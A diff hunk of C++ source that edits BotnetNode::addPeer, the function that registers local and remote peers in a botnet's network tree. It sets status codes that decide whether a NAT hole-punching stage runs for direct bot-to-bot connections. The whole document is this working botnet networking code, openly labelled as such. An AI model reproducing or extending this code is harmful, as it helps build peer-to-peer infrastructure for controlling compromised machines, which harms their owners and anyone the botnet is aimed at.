@@ -59,37 +59,41 @@ struct sockaddr_in BotnetNode::addPeer(
 	/* locals */
 	struct sockaddr_in peer_addr;
 	std::vector<adr> hosts;
-	//const struct botnet_pack* pack = ;
 
 	/* 0ing peer_addr struct */
 	ZeroMemory(&peer_addr, sizeof(peer_addr));
 	*status = 0;
 	
-	/* check if local peer */
+	/* check if peer is local */
 	if (pack->dst_peer.ip + pack->dst_peer.port == 0)
+	{
+		/* if peer is not in the network tree */
 		if (!findNode({ private_addr.sin_addr.s_addr, private_addr.sin_port }, hosts))
 		{
 			/* add to tree */
 			_branches.push_back(new BotnetNode(private_addr.sin_addr.s_addr, private_addr.sin_port));
-			pack->private_peer.ip == 0 ? *status = 1 : *status = 2; // successful local (reply back if 1).
-			return private_addr;
+			pack->private_peer.ip == 0 ? *status = 1 : *status = 3; // successful local (reply back if 1, skip stage 2 (PunchHole)).
+
+			/* raw addr of peer (return) */
+			peer_addr = private_addr;
 		}
-
-	/* if peer is not in the network tree */
-	hosts.clear();
-	if (!findNode({ pack->dst_peer.ip, pack->dst_peer.port }, hosts)) 
-	{
-		/* create addr struct for peer (for direct communication) */
-		peer_addr.sin_family = AF_INET;
-		peer_addr.sin_port = htons(pack->dst_peer.port);
-		peer_addr.sin_addr.s_addr = htonl(pack->dst_peer.ip);
-
-		/* add to tree */
-		_branches.push_back(new BotnetNode(pack->dst_peer.ip, pack->dst_peer.port));
-		
-		*status = 2; // successful remote
 	}
+	else // peer is not local
 
+		/* if peer is not in the network tree */
+		if (!findNode({ pack->dst_peer.ip, pack->dst_peer.port }, hosts))
+		{
+			/* create raw addr struct of peer (for direct communication) (return) */
+			peer_addr.sin_family = AF_INET;
+			peer_addr.sin_port = htons(pack->dst_peer.port);
+			peer_addr.sin_addr.s_addr = htonl(pack->dst_peer.ip);
+
+			/* add to tree */
+			_branches.push_back(new BotnetNode(pack->dst_peer.ip, pack->dst_peer.port));
+
+			*status = 2; // successful remote (execute stage 2 PunchHole)
+		}
+	
 	return peer_addr;
 }
 
